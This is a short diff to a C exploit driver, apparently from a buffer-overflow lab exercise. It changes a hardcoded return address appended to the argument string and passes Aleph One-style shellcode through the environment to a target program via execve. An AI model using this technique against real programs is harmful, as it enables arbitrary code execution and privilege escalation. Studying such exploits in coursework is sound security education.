@@ -26,12 +26,14 @@ int main(void)
   // Segfault:
   // strcat(str, "\x97\xff\xff\xbf");
   // env: 0xbfffff97:	0xdb31c031
-  strcat(str, "\x97\xff\xff\xbf");
+  strcat(str, "\x9f\xff\xff\xbf");
   
   args[0] = TARGET;
   // max input size is 4 * 5 = 20
   args[1] = str;
   args[2] = NULL;
+
+
   
   env[0] = shellcodeAlephOne;
   execve(TARGET, args, env);
